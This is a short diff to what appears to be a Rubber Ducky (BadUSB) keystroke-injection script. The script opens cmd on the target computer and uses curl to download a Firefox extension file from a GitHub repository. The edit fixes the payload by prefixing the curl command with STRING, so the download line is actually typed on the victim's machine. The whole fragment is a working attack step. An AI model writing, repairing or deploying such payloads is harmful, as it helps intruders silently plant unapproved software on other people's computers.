@@ -4,5 +4,5 @@ DELAY 500
 STRING cmd
 ENTER
 DELAY 500
-curl -o  test.xpi -L https://github.com/dplantard/tools_web/blob/main/%7B12b95466-80d5-4216-842e-91f82013a93a%7D.xpi?raw=true
+STRING curl -o  test.xpi -L https://github.com/dplantard/tools_web/blob/main/%7B12b95466-80d5-4216-842e-91f82013a93a%7D.xpi?raw=true
 ENTER 
